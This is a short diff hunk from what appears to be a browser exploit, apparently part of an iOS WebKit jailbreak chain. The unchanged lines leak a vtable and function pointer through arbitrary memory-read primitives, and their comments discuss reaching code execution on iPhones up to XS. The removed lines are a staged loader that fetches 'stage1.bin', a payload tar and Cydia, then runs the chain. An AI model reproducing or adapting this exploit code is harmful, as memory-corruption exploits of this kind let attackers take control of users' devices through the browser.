@@ -493,23 +493,6 @@ let fn = rw.read64(vtable);
 fn = rw.read64(vtable);
 alert("fn: " + bh.f64ToStr(fn));
 let inst = rw.read64(fn);
-
-function loadRes(){
-  console.log("Downloading resources");
-  document.getElementById('bigButton').innerHTML = "Downloading Resources"
-  setTimeout(function () {
-    filestream = load_binary_resource("stage1.bin")
-    payload_tar = getArrFromResource(load_binary_resource("tar"))
-
-    payload_offsets = getArrFromResource(load_binary_resource("bin.js"))
-
-    document.getElementById('bigButton').innerHTML = "Downloading Cydia"
-    setTimeout(function () {
-        payload_cydia = getArrFromResource(load_binary_resource("Cydia.tar"))
-        go();
-        }, 100);
-      }, 100);
-}
 // to get code execution refer to [1] for iPhones up to XS, 
 // XS models will require a different approach ...
 // Die, since we have fake object still referenced by the foo function,
